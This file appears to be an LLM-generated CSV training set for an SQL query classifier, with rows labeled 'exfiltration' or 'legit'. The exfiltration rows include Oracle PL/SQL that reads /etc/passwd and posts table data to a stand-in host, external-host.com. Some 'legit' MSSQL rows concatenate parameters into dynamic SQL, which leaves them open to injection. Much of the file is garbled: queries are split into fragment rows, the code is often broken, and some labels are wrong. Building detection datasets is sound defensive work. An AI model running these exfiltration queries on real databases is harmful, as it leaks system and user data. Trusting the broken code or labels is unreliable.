query,label,label_name,source
"WITH x AS (SELECT LEVEL, LEVEL+1 FROM DUAL CONNECT BY LEVEL <= 10000), y AS (SELECT * FROM x WHERE LEVEL BETWEEN 1 AND 10000) SELECT * FROM y",4,exfiltration,generated_groq_oracle_advanced
"DECLARE l_file UTL_FILE.FOPEN('/etc/passwd', 1); l_line UTL_FILE.GET_LINE(l_file, 1); BEGIN DBMS_OUTPUT.PUT_LINE(l_line); UTL_FILE.FCLOSE(l_file); END;",4,exfiltration,generated_groq_oracle_advanced
"DECLARE l_http UTL_HTTP.REQUEST('http://EXTERNALHOST'); l_xml XMLTYPE := XMLSequence(l_http); l_clob XMLSequence(l_xml).getCLOBVAL; BEGIN UTL_FILE.PUT_LINE(l_clob.GETCLOBVAL, 1); END;",4,exfiltration,generated_groq_oracle_advanced
WITH x AS (SELECT LEVEL FROM DUAL CONNECT BY LEVEL <= 10000) SELECT * FROM x WHERE LEVEL BETWEEN 1 AND 10000,4,exfiltration,generated_groq_oracle_advanced
WITH x AS (SELECT LEVEL FROM DUAL CONNECT BY LEVEL <= 10000) SELECT LEVEL FROM x,4,exfiltration,generated_groq_oracle_advanced
"SELECT * FROM all_tab_columns WHERE TABLENAME = (WITH RECURSIVE x AS (SELECT LEVEL, LEVEL+1 FROM DUAL CONNECT BY LEVEL <= 10000) SELECT LEVEL FROM x WHERE LEVEL BETWEEN 1 AND 10000)",4,exfiltration,generated_groq_oracle_advanced
"DBMS_ADVISOR.add_workload_session('SELECT * FROM SYSTEM.ALL_TABLES', 'http://external-host.com/receive_data.asp');",4,exfiltration,generated_groq_oracle_advanced
"DECLARE v_file UTL_FILE.FILE_TYPE; v_len NUMBER; v_pos NUMBER; v_line VARCHAR2(32767); v_block BLOB; v_offset NUMBER; v_num BLOBS NUMBER; v_cnt NUMBER; BEGIN v_file := UTL_FILE.fopen('EXTPROC1','w',32767,32767); UTL_HTTP.request('http://external-host.com/utl_file_upload.asp',UTL_FILE.fread(v_file)); END;/",4,exfiltration,generated_groq_oracle_advanced
DECLARE v_xml XMLType := XMLType('<root><table><data>'||XMLQuery('XMLELEMENT(,4,exfiltration,generated_groq_oracle_advanced
", XMLAGG(",4,exfiltration,generated_groq_oracle_advanced
ename,4,exfiltration,generated_groq_oracle_advanced
name,4,exfiltration,generated_groq_oracle_advanced
type,4,exfiltration,generated_groq_oracle_advanced
")) FOR d IN (SELECT * FROM all_users ORDER BY d.name)', 'xmlns=",4,exfiltration,generated_groq_oracle_advanced
")||'</data></table></root>').getCLOBVal(); v_req := UTL_HTTP.begin_request('http://external-host.com/receive_xml.asp', 'POST', 'HTTP/1.1', 80); UTL_HTTP.set_header(v_req, 'Content-Type', 'text/xml'); UTL_HTTP.set_header(v_req, 'Content-Length', length(v_xml)); UTL_HTTP.write_text(v_req, v_xml); UTL_HTTP.end_request(v_req);",4,exfiltration,generated_groq_oracle_advanced
"DECLARE v_clob CLOB := SYS.DBMS_ADVISOR.GET_REPORT('workload session','1'); UTL_HTTP.request('http://external-host.com/utl_http_request.asp', 'Content-Type', 'text/plain', length(v_clob), v_clob);",4,exfiltration,generated_groq_oracle_advanced
"DECLARE c REFCURSOR: BEGIN c := CURSOR(SYS.DBMS_ADVISOR.GET_REPORTS('workload session','1')); DBMS_SQL.RETURN_RESULT(c);",4,exfiltration,generated_groq_oracle_advanced
SELECT XMLSerialize(DOCUMENT XMLQuery('XMLELEMENT(,4,exfiltration,generated_groq_oracle_advanced
)').GETCLOBSIZE() FROM DUAL;,4,exfiltration,generated_groq_oracle_advanced
"DECLARE v_req NUMBER := DBMS_ADVISOR.CREATE_WORKLOAD_SESSION('SELECT * FROM SYSTEM.ALL_TABLES','http://external-host.com/receive_data.asp'); ",4,exfiltration,generated_groq_oracle_advanced
SELECT XMLSerialize(DOCUMENT XMLType('SELECT * FROM all_users')).GETCLOBSIZE() FROM DUAL;,4,exfiltration,generated_groq_oracle_advanced
)||'</data></table></root>').getCLOBVal(); v_block BLOB;,4,exfiltration,generated_groq_oracle_advanced
"SELECT dbms_advisor.format_report('workload session','1') FROM DUAL;",4,exfiltration,generated_groq_oracle_advanced
)||'</data></table>').getCLOBVal();,4,exfiltration,generated_groq_oracle_advanced
"DECLARE v_req NUMBER := UTL_HTTP.begin_request('http://external-host.com/utl_http_request.asp','POST','HTTP/1.1', 80); UTL_HTTP.set_header(v_req,'Content-Type','text/plain'); v_clob CLOB := DBMS_ADVISOR.GET_REPORT('workload session','1'); UTL_HTTP.write_text(v_req,v_clob);",4,exfiltration,generated_groq_oracle_advanced
SELECT XMLSerialize(DOCUMENT XMLType('<table><data>'||XMLQuery('XMLELEMENT(,4,exfiltration,generated_groq_oracle_advanced
")) FOR d IN (SELECT * FROM (SELECT * FROM all_users ORDER BY name) AS a WHERE a.ename LIKE ''%'') ORDER BY d.name', 'xmlns=",4,exfiltration,generated_groq_oracle_advanced
)||'</data></table>'),4,exfiltration,generated_groq_oracle_advanced
XMLFOREST(,4,exfiltration,generated_groq_oracle_advanced
http://www.oracle.com/xmldb,4,exfiltration,generated_groq_oracle_advanced
SET NAMES utf8mb4;,0,legit,generated_groq_mysql_simple
"CREATE TABLE IF NOT EXISTS customers (id INT PRIMARY KEY AUTO_INCREMENT, email VARCHAR(255))",0,legit,generated_groq_mysql_simple
CREATE INDEX idx_email ON customers(email);,0,legit,generated_groq_mysql_simple
ALTER TABLE orders ADD FOREIGN KEY fk_customer (customer_id) REFERENCES customers(id);,0,legit,generated_groq_mysql_simple
"CREATE TABLE IF NOT EXISTS products (id INT PRIMARY KEY AUTO_INCREMENT, name VARCHAR(255))",0,legit,generated_groq_mysql_simple
"CREATE TABLE IF NOT EXISTS orders (id INT PRIMARY KEY AUTO_INCREMENT, customer_id INT, product_id INT, FOREIGN KEY fk_customer (customer_id) REFERENCES customers(id), FOREIGN KEY fk_product (product_id) REFERENCES products(id));",0,legit,generated_groq_mysql_simple
INSERT INTO customers (email) VALUES ('user1@example.com');,0,legit,generated_groq_mysql_simple
INSERT INTO products (name) VALUES ('Product A');,0,legit,generated_groq_mysql_simple
"INSERT INTO orders (customer_id, product_id) VALUES (1, 1);",0,legit,generated_groq_mysql_simple
SELECT * FROM customers WHERE email = ?;,0,legit,generated_groq_mysql_simple
SELECT products.name FROM orders JOIN products ON orders.product_id = products.id WHERE orders.customer_id = ?;,0,legit,generated_groq_mysql_simple
"SELECT products.name, COUNT(*) as order_count FROM orders JOIN products ON orders.product_id = products.id GROUP BY products.name;",0,legit,generated_groq_mysql_simple
ALTER TABLE orders ADD INDEX idx_customer_id (customer_id);,0,legit,generated_groq_mysql_simple
ALTER TABLE orders ADD INDEX idx_product_id (product_id);,0,legit,generated_groq_mysql_simple
"CREATE TABLE IF NOT EXISTS order_history (id INT PRIMARY KEY AUTO_INCREMENT, order_id INT, FOREIGN KEY fk_order (order_id) REFERENCES orders(id));",0,legit,generated_groq_mysql_simple
INSERT INTO order_history (order_id) VALUES (1);,0,legit,generated_groq_mysql_simple
SELECT customers.email FROM orders JOIN customers ON orders.customer_id = customers.id WHERE orders.customer_id = ?;,0,legit,generated_groq_mysql_simple
"SELECT customers.name, SUM(orders.price) as total_spent FROM customers LEFT JOIN orders ON customers.id = orders.customer_id GROUP BY customers.name;",0,legit,generated_groq_mysql_simple
SELECT * FROM customers WHERE country='?',0,legit,generated_groq_mysql_simple
SELECT * FROM orders WHERE customer_id='?' AND order_status='?',0,legit,generated_groq_mysql_simple
CREATE INDEX idx_customer_email ON customers (email);,0,legit,generated_groq_mysql_simple
"INSERT INTO orders (customer_id, order_date, total) VALUES ('?', current_timestamp(), '?');",0,legit,generated_groq_mysql_simple
SELECT AVG(total) FROM orders WHERE order_date BETWEEN '?' AND '?',0,legit,generated_groq_mysql_simple
DROP INDEX idx_customer_email;,0,legit,generated_groq_mysql_simple
SELECT * FROM customers WHERE email='?' AND password='?' AND active='?',0,legit,generated_groq_mysql_simple
SELECT * FROM orders WHERE order_id='?' AND total > '?',0,legit,generated_groq_mysql_simple
CREATE INDEX idx_product_sku ON products (sku);,0,legit,generated_groq_mysql_simple
SELECT * FROM products WHERE category='?' AND price < '?',0,legit,generated_groq_mysql_simple
UPDATE orders SET status='?' WHERE order_id='?',0,legit,generated_groq_mysql_simple
DELETE FROM products WHERE sku='?',0,legit,generated_groq_mysql_simple
SELECT * FROM orders WHERE order_id IN ('?'),0,legit,generated_groq_mysql_simple
"INSERT INTO orders_products (order_id, product_id, quantity) VALUES ('?', '?', '?');",0,legit,generated_groq_mysql_simple
ALTER TABLE orders ADD COLUMN status VARCHAR(255);,0,legit,generated_groq_mysql_simple
"UPDATE customers SET name='?', email='?' WHERE customer_id='?'",0,legit,generated_groq_mysql_simple
SELECT * FROM customers WHERE name='?' AND email='?',0,legit,generated_groq_mysql_simple
CREATE TABLE customers_backup LIKE customers;,0,legit,generated_groq_mysql_simple
SELECT * FROM orders WHERE order_date > '?' AND customer_id='?',0,legit,generated_groq_mysql_simple
SELECT * FROM orders WHERE customer_id IN ('?'),0,legit,generated_groq_mysql_simple
SELECT id FROM customers WHERE email = ? AND password = ?,0,legit,generated_groq_mysql_simple
SELECT name FROM orders JOIN customers ON orders.customer_id = customers.id WHERE orders.order_id = ?,0,legit,generated_groq_mysql_simple
UPDATE orders SET status = ? WHERE order_id = ?,0,legit,generated_groq_mysql_simple
"INSERT INTO customers (email, password, name) VALUES (?, ?, ?);",0,legit,generated_groq_mysql_simple
SELECT name FROM orders JOIN customers ON orders.customer_id = customers.id WHERE orders.order_id = ? AND orders.status = ?,0,legit,generated_groq_mysql_simple
SELECT customer_id FROM orders WHERE order_id = ?;,0,legit,generated_groq_mysql_simple
SELECT * FROM orders WHERE order_id IN (SELECT order_id FROM order_items WHERE product_id=? AND price>? AND created_at>?);,0,legit,generated_groq_mysql_advanced
CREATE INDEX idx_orders_customers ON orders (customer_id);,0,legit,generated_groq_mysql_advanced
"INSERT INTO customers (name, email) VALUES (?, ?);",0,legit,generated_groq_mysql_advanced
SELECT * FROM customers WHERE id NOT IN (SELECT customer_id FROM orders WHERE status='cancelled');,0,legit,generated_groq_mysql_advanced
UPDATE orders SET status=? WHERE id=?;,0,legit,generated_groq_mysql_advanced
DROP TABLE IF EXISTS temporary_table;,0,legit,generated_groq_mysql_advanced
SELECT * FROM orders WHERE total_cost > (SELECT AVG(total_cost) FROM orders);,0,legit,generated_groq_mysql_advanced
CREATE VIEW customer_orders AS SELECT * FROM orders WHERE status='active';,0,legit,generated_groq_mysql_advanced
SELECT c.* FROM customers c JOIN orders o ON c.id=o.customer_id WHERE c.name=?;,0,legit,generated_groq_mysql_advanced
SELECT * FROM orders WHERE order_id IN (SELECT order_id FROM order_items WHERE product_id=? AND quantity>?);,0,legit,generated_groq_mysql_advanced
"WITH recursive customer_orders AS (SELECT id, name, status FROM orders UNION ALL SELECT o.id, c.name, o.status FROM orders o JOIN customers c ON o.customer_id=c.id WHERE o.status='active') SELECT * FROM customer_orders;",0,legit,generated_groq_mysql_advanced
SELECT * FROM orders WHERE id IN (SELECT order_id FROM order_items WHERE product_id=? AND price>?);,0,legit,generated_groq_mysql_advanced
CREATE INDEX idx_orders_product_id ON orders (product_id);,0,legit,generated_groq_mysql_advanced
TRUNCATE TABLE order_items;,0,legit,generated_groq_mysql_advanced
SELECT * FROM customers WHERE email LIKE ?;,0,legit,generated_groq_mysql_advanced
"INSERT INTO products (name, price) VALUES (?, ?);",0,legit,generated_groq_mysql_advanced
DELETE FROM order_items WHERE product_id IN (SELECT id FROM products WHERE price>?);,0,legit,generated_groq_mysql_advanced
SELECT * FROM orders WHERE order_id NOT IN (SELECT order_id FROM order_items WHERE product_id=?);,0,legit,generated_groq_mysql_advanced
SELECT * FROM customers WHERE created_at >= ? AND created_at <= ?;,0,legit,generated_groq_mysql_advanced
WITH temp AS (SELECT order_id FROM order_items WHERE product_id=?) SELECT * FROM orders WHERE id IN (temp.order_id);,0,legit,generated_groq_mysql_advanced
SELECT * FROM orders WHERE status!='cancelled' AND status!='paid';,0,legit,generated_groq_mysql_advanced
SELECT * FROM orders WHERE customer_id IN (SELECT customer_id FROM customers WHERE country = ?) AND order_total > ?;,0,legit,generated_groq_mysql_advanced
SELECT * FROM orders WHERE id IN (SELECT orders.id FROM orders JOIN order_items ON orders.id = order_items.order_id GROUP BY orders.id HAVING SUM(orders_total) > ?);,0,legit,generated_groq_mysql_advanced
"CREATE VIEW order_summary AS SELECT orders.id, orders.order_date, SUM(order_items.quantity) AS totalQuantity FROM orders JOIN order_items ON orders.id = order_items.order_id GROUP BY orders.id; SELECT * FROM order_summary WHERE customer_id = ?;",0,legit,generated_groq_mysql_advanced
"WITH customer_orders AS (SELECT orders.id, orders.customer_id, SUM(order_items.quantity) AS totalQuantity FROM orders JOIN order_items ON orders.id = order_items.order_id GROUP BY orders.id) SELECT * FROM customer_orders WHERE totalQuantity > ? AND customer_id = ?;",0,legit,generated_groq_mysql_advanced
SELECT distinct products.name FROM order_items JOIN products ON order_items.product_id = products.id WHERE order_items.order_id IN (SELECT id FROM orders WHERE total_amount > ? GROUP BY id ORDER BY COUNT(id) DESC LIMIT ?);,0,legit,generated_groq_mysql_advanced
"SELECT orders.id, orders.order_date FROM orders JOIN order_items ON orders.id = order_items.order_id GROUP BY orders.id HAVING MAX(order_items.order_date) < MIN(order_items.order_date) ;",0,legit,generated_groq_mysql_advanced
SELECT distinct p.name FROM products p JOIN categories c ON p.category_id = c.id WHERE c.id IN (SELECT category_id FROM products WHERE name LIKE ? LIMIT ?);,0,legit,generated_groq_mysql_advanced
"SELECT orders.id, orders.order_date FROM orders JOIN order_items ON orders.id = order_items.order_id WHERE order_items.product_id = ? AND order_items.quantity < ?;",0,legit,generated_groq_mysql_advanced
SELECT * FROM orders WHERE id IN (SELECT order_id FROM order_items JOIN products ON order_items.product_id = products.id WHERE products.name = ?);,0,legit,generated_groq_mysql_advanced
SELECT o.* FROM orders o JOIN customers c ON o.customer_id = c.id WHERE c.country IN (SELECT country FROM customers c JOIN orders o ON c.id = o.customer_id GROUP BY c.country ORDER BY COUNT(o.id) DESC LIMIT ?);,0,legit,generated_groq_mysql_advanced
"SELECT p.category_id, COUNT(p.id) AS product_count FROM products p GROUP BY p.category_id ORDER BY product_count DESC LIMIT ?;",0,legit,generated_groq_mysql_advanced
"SELECT *, IF(SUM(price * quantity), TRUE, FALSE) AS isOrderTotalMoreThanZero FROM order_items GROUP BY order_id HAVING isOrderTotalMoreThanZero = FALSE;",0,legit,generated_groq_mysql_advanced
"SELECT orders.order_id, orders.order_date FROM orders JOIN order_items ON orders.id = order_items.order_id WHERE order_items.product_id != ? GROUP BY orders.id ORDER BY orders.total_amount LIMIT ?;",0,legit,generated_groq_mysql_advanced
"SELECT customers.id, SUM(orders.total_amount) AS total_amount FROM customers JOIN orders ON customers.id = orders.customer_id GROUP BY customers.id ORDER BY total_amount DESC LIMIT ?;",0,legit,generated_groq_mysql_advanced
"SELECT o.id, o.customer_id FROM orders o JOIN order_items oi ON o.id = oi.order_id WHERE oi.product_id IN (SELECT product_id FROM products WHERE name LIKE ? AND category_id IN (SELECT category_id FROM categories WHERE id = ?)) GROUP BY o.customer_id LIMIT ?;",0,legit,generated_groq_mysql_advanced
"SELECT customers.id, o.order_date, o.order_id FROM customers JOIN orders o ON customers.id = o.customer_id WHERE customers.email = ? AND o.order_amount < ?;",0,legit,generated_groq_mysql_advanced
"SELECT orders.id, orders.order_date, COUNT(order_items.id) AS productCount FROM orders JOIN order_items ON orders.id = order_items.order_id GROUP BY orders.id ORDER BY productCount DESC LIMIT ?;",0,legit,generated_groq_mysql_advanced
"SELECT p.id, SUM(oi.quantity) AS totalquantity FROM products p JOIN order_items oi ON p.id = oi.product_id GROUP BY p.id HAVING totalquantity > ?;",0,legit,generated_groq_mysql_advanced
"SELECT customers.email, SUM(orders.total_amount) AS total_amount FROM customers JOIN orders ON customers.id = orders.customer_id GROUP BY customers.email ORDER BY total_amount DESC;",0,legit,generated_groq_mysql_advanced
"SELECT orders.id, orders.order_total FROM orders WHERE id IN (SELECT order_id FROM order_items JOIN products ON order_items.product_id = products.id WHERE category IN (SELECT c.category FROM products p JOIN categories c ON p.category_id = c.id GROUP BY c.category)));",0,legit,generated_groq_mysql_advanced
"SELECT orders.id, orders.customer_id, orders.order_date, customers.name FROM orders JOIN customers ON orders.customer_id = customers.id WHERE orders.total_amount > (SELECT AVG(total_amount) FROM orders) AND customers.id IN (SELECT customer_id FROM orders GROUP BY customer_id HAVING COUNT(*) > 50) AND orders.id NOT IN (SELECT order_id FROM order_items WHERE product_id = 101 AND quantity > 50);",0,legit,generated_groq_mysql_advanced
"WITH RECURSIVE order_tree AS (SELECT order_id, parent_order_id, id, level FROM orders WHERE parent_order_id IS NULL UNION ALL SELECT t.order_id, t.parent_order_id, o.id, level + 1 FROM orders o JOIN order_tree t ON o.parent_order_id = t.id) SELECT * FROM order_tree WHERE level > 2;",0,legit,generated_groq_mysql_advanced
"SELECT customers.id, customers.name, orders.id, orders.order_date FROM customers JOIN orders ON customers.id = orders.customer_id WHERE orders.order_date BETWEEN ? AND ? AND orders.total_amount IN (SELECT total_amount FROM orders WHERE order_date BETWEEN ? AND ?) ORDER BY orders.order_date DESC LIMIT 50;",0,legit,generated_groq_mysql_advanced
"SELECT id, name FROM products WHERE (UPPER(name) LIKE ? ESCAPE '\') OR (UPPER(name) LIKE ? ESCAPE '\\');",0,legit,generated_groq_mysql_advanced
"SELECT customers.id, customers.name, SUM(orders.total_amount) AS total_spend, COUNT(orders.id) AS num_orders FROM customers LEFT JOIN orders ON customers.id = orders.customer_id GROUP BY customers.id ORDER BY total_spend DESC LIMIT 100;",0,legit,generated_groq_mysql_advanced
"SELECT orders.id, orders.order_date, customers.id, customers.name FROM orders JOIN customers ON orders.customer_id = customers.id WHERE orders.total_amount BETWEEN ? AND ? GROUP BY (DATE_FORMAT(orders.order_date, '%Y-%m-%d')) ORDER BY orders.order_date ASC;",0,legit,generated_groq_mysql_advanced
"SELECT id, name, price, product_id FROM products WHERE id IN (SELECT product_id FROM order_items WHERE order_id IN (SELECT id FROM orders WHERE customer_id = ?));",0,legit,generated_groq_mysql_advanced
"SELECT orders.id, customers.id, orders.order_date, products.name FROM orders JOIN customers ON orders.customer_id = customers.id JOIN order_items ON orders.id = order_items.order_id JOIN products ON order_items.product_id = products.id WHERE orders.total_amount > ? AND customers.id = ? AND products.category = ? ORDER BY orders.order_date DESC;",0,legit,generated_groq_mysql_advanced
SELECT COUNT(*) FROM (SELECT id FROM orders WHERE total_amount > (SELECT AVG(total_amount) FROM orders) AND customers.id IN (SELECT customer_id FROM orders GROUP BY customer_id HAVING COUNT(*) > 50) AND orders.id NOT IN (SELECT order_id FROM order_items WHERE product_id = 101 AND quantity > 50)) t;,0,legit,generated_groq_mysql_advanced
json_string,0,legit,generated_groq_mssql_simple
users,0,legit,generated_groq_mssql_simple
' + u.name + ',0,legit,generated_groq_mssql_simple
message,0,legit,generated_groq_mssql_simple
"Hello, world!",0,legit,generated_groq_mssql_simple
categories,0,legit,generated_groq_mssql_simple
' + c.name + ',0,legit,generated_groq_mssql_simple
posts,0,legit,generated_groq_mssql_simple
' + p.title + ',0,legit,generated_groq_mssql_simple
success,0,legit,generated_groq_mssql_simple
products,0,legit,generated_groq_mssql_simple
' + p.name + ',0,legit,generated_groq_mssql_simple
update,0,legit,generated_groq_mssql_simple
delete,0,legit,generated_groq_mssql_simple
orders,0,legit,generated_groq_mssql_simple
' + o.id + ',0,legit,generated_groq_mssql_simple
product_added,0,legit,generated_groq_mssql_simple
' + u.email + ',0,legit,generated_groq_mssql_simple
item1,0,legit,generated_groq_mssql_simple
item5,0,legit,generated_groq_mssql_simple
item3,0,legit,generated_groq_mssql_simple
key1,0,legit,generated_groq_mssql_simple
value1,0,legit,generated_groq_mssql_simple
key2,0,legit,generated_groq_mssql_simple
value2,0,legit,generated_groq_mssql_simple
name,0,legit,generated_groq_mssql_simple
John,0,legit,generated_groq_mssql_simple
Mary,0,legit,generated_groq_mssql_simple
Jane,0,legit,generated_groq_mssql_simple
"WITH LockedTables AS (SELECT database_name, TABLE_NAME FROM fn_dblog(NULL, NULL) WHERE operation = 'LOP_LOCK') SELECT TOP 10 TABLE_NAME FROM LockedTables;",0,legit,generated_groq_mssql_advanced
DECLARE @param INT = 5; SELECT TOP 1 * FROM TABLE_NAME WHERE COLUMN_NAME = @param;,0,legit,generated_groq_mssql_advanced
"WITH RecursiveCTE AS (SELECT TABLE_NAME, 0 AS LEVEL FROM TABLE_NAME UNION ALL SELECT t.TABLE_NAME, LEVEL + 1 FROM TABLE_NAME INNER JOIN RecursiveCTE r ON r.TABLE_NAME = t.PARENT_TABLE_NAME) SELECT * FROM RecursiveCTE WHERE LEVEL > 5;",0,legit,generated_groq_mssql_advanced
DECLARE @param VARCHAR(50) = 'SELECT * FROM TABLE_NAME'; EXEC sp_executesql @param;,0,legit,generated_groq_mssql_advanced
SELECT TOP 10 TABLE_NAME FROM TABLE_NAME WHERE EXISTS (SELECT 1 FROM TABLE_NAME WHERE COLUMN_NAME = 'value');,0,legit,generated_groq_mssql_advanced
"WITH CTE AS (SELECT TABLE_NAME, ROW_NUMBER() OVER (ORDER BY COLUMN_NAME) AS RN FROM TABLE_NAME) SELECT * FROM CTE WHERE RN BETWEEN 10 AND 20;",0,legit,generated_groq_mssql_advanced
"SELECT ROW_NUMBER() OVER (ORDER BY COLUMN_NAME) AS RN, TABLE_NAME INTO #TempTable FROM TABLE_NAME; SELECT TOP 5 * FROM #TempTable;",0,legit,generated_groq_mssql_advanced
SELECT TOP 1 TABLE_NAME FROM TABLE_NAME WHERE ID IN (SELECT ID FROM TABLE_NAME WHERE COLUMN_NAME = 'value');,0,legit,generated_groq_mssql_advanced
SELECT TOP 10 * FROM TABLE_NAME WHERE EXISTS (SELECT 1 FROM TABLE_NAME INNER JOIN TABLE_NAME ON TABLE_NAME.COLUMN_NAME = TABLE_NAME.COLUMN_NAME WHERE TABLE_NAME.COLUMN_NAME = 'value');,0,legit,generated_groq_mssql_advanced
"WITH CTE AS (SELECT TABLE_NAME, ROW_NUMBER() OVER (ORDER BY COLUMN_NAME) AS RN FROM TABLE_NAME) DELETE FROM CTE WHERE RN BETWEEN 5 AND 10;",0,legit,generated_groq_mssql_advanced
DECLARE @param VARCHAR(50) = 'Table1'; SELECT TOP 10 * FROM @param;,0,legit,generated_groq_mssql_advanced
CREATE PROCEDURE sp_TestProc @param INT AS BEGIN SELECT TOP 10 * FROM TABLE_NAME WHERE COLUMN_NAME = @param; END;,0,legit,generated_groq_mssql_advanced
"WITH CTE AS (SELECT TABLE_NAME, ROW_NUMBER() OVER (ORDER BY COLUMN_NAME) AS RN FROM TABLE_NAME) SELECT TOP 10 * INTO #TempTable FROM CTE WHERE TABLE_NAME = 'Table1';",0,legit,generated_groq_mssql_advanced
SELECT TOP 5 * FROM TABLE_NAME WHERE ID IN (SELECT ID FROM TABLE_NAME WHERE COLUMN_NAME = (SELECT COLUMN_NAME FROM TABLE_NAME WHERE COLUMN_NAME = 'value'));,0,legit,generated_groq_mssql_advanced
DECLARE @param INT = 10; WHILE @param > 0 BEGIN SELECT TOP 1 * FROM TABLE_NAME WHERE COLUMN_NAME = @param; SET @param -= 1; END;,0,legit,generated_groq_mssql_advanced
"WITH CTE AS (SELECT TABLE_NAME, ROW_NUMBER() OVER (ORDER BY COLUMN_NAME) AS RN FROM TABLE_NAME) WITH RECURSIVE RecursiveCTE AS (SELECT TABLE_NAME, RN, 0 AS LEVEL FROM CTE UNION ALL SELECT r.TABLE_NAME, r.RN, LEVEL + 1 FROM CTE c INNER JOIN RecursiveCTE r ON c.TABLE_NAME = r.TABLE_NAME AND c.RN = r.RN + 1) SELECT * FROM RecursiveCTE;",0,legit,generated_groq_mssql_advanced
EXEC sp_TestProc 10;,0,legit,generated_groq_mssql_advanced
WITH LockedTables AS (SELECT table_name FROM sys.system_internaLocks WHERE resource_type = 'U') SELECT TOP 10 table_name FROM LockedTables,0,legit,generated_groq_mssql_advanced
@param nvarchar(100) = '' DECLARE @query nvarchar(max) = 'SELECT * FROM table_name WHERE name = ''' + @param + '''' EXEC sp_executesql @query,0,legit,generated_groq_mssql_advanced
"WITH T AS (SELECT *, ROW_NUMBER() OVER (ORDER BY created_at) AS rn FROM table_name) SELECT * FROM T WHERE rn BETWEEN 1 AND 10",0,legit,generated_groq_mssql_advanced
"INSERT INTO table2 SELECT * FROM table1 WHERE date BETWEEN ''' + @param + ''' AND DATEADD(day, 1, ''' + @param + ''')",0,legit,generated_groq_mssql_advanced
"WITH RecursiveT AS (SELECT table_name, 0 AS level FROM sys.tables UNION ALL SELECT referenced_entity_name, level + 1 FROM sys.sql_expression_dependencies WHERE referencing_entity_name = 'table_name' AND referenced_class = 'OBJECT') SELECT level, table_name FROM RecursiveT ORDER BY level",0,legit,generated_groq_mssql_advanced
INSERT INTO table2 SELECT * FROM table1 WHERE date BETWEEN ''' + @param + ''' AND ''' + @param + ''',0,legit,generated_groq_mssql_advanced
"@param nvarchar(100) = '' DECLARE @query nvarchar(max) = 'SELECT * FROM table_name WHERE name IN (''' + STUFF((SELECT'''' + name + '''',''' FROM table_name FOR XML PATH('')),1,1,''') + '''')' EXEC sp_executesql @query",0,legit,generated_groq_mssql_advanced
WITH LockedColumns AS (SELECT column_name FROM sys.system_internaLocks WHERE resource_type = 'C') SELECT TOP 10 column_name FROM LockedColumns,0,legit,generated_groq_mssql_advanced
DELETE t FROM table_name t JOIN table2 t2 ON t.primary_key = t2.foreign_key WHERE date BETWEEN ''' + @param + ''' AND ''' + @param + ''',0,legit,generated_groq_mssql_advanced
"INSERT INTO table2 SELECT * FROM table1 WHERE column_name IN (''' + @param + '''',''' + @param + ''')",0,legit,generated_groq_mssql_advanced
SELECT TOP 10 * FROM table_name WHERE column_name IN (''' + TABLENAME + '''),0,legit,generated_groq_mssql_advanced
INSERT INTO table2 SELECT * FROM table1 WHERE column_name = ''' + @param + ''',0,legit,generated_groq_mssql_advanced
"WITH LockedTables AS (SELECT table_name FROM sys.system_internaLocks WHERE resource_type = 'U') SELECT table_name FROM LockedTables WHERE table_name NOT IN ('table1','table2')",0,legit,generated_groq_mssql_advanced
SELECT TOP 10 * FROM table_name WHERE column_name IN (SELECT name FROM sys.system_internaLocks),0,legit,generated_groq_mssql_advanced
"$SELECT TOP 10 *, ROW_NUMBER() OVER (ORDER BY id) AS row_num FROM [dbo].[table_name] WITH (NOLOCK)",0,legit,generated_groq_mssql_advanced
CREATE PROCEDURE sp_GetData @param INT AS SELECT * FROM [dbo].[table_name] WHERE column_name = @param,0,legit,generated_groq_mssql_advanced
DECLARE @param INT = 10; EXEC sp_GetData @param;,0,legit,generated_groq_mssql_advanced
"SELECT * FROM (SELECT *, ROW_NUMBER() OVER (PARTITION BY column_name ORDER BY id) AS row_num FROM [dbo].[table_name]) AS subquery",0,legit,generated_groq_mssql_advanced
"WITH cte AS (SELECT column_name, ROW_NUMBER() OVER (PARTITION BY column_name ORDER BY id) AS row_num FROM [dbo].[table_name]) SELECT * FROM cte WHERE row_num = 1",0,legit,generated_groq_mssql_advanced
DECLARE @param INT = 1; EXEC sp_get_data_stored_procedure @param; SELECT * FROM #temp_table,0,legit,generated_groq_mssql_advanced
SELECT * FROM [dbo].[table_name] WHERE column_name IN (SELECT TOP 10 column_name FROM [dbo].[table_name] WITH (NOLOCK) ORDER BY id DESC),0,legit,generated_groq_mssql_advanced
DECLARE @param INT = 10; SELECT * INTO #temp_table FROM [dbo].[table_name] WHERE column_name = @param,0,legit,generated_groq_mssql_advanced
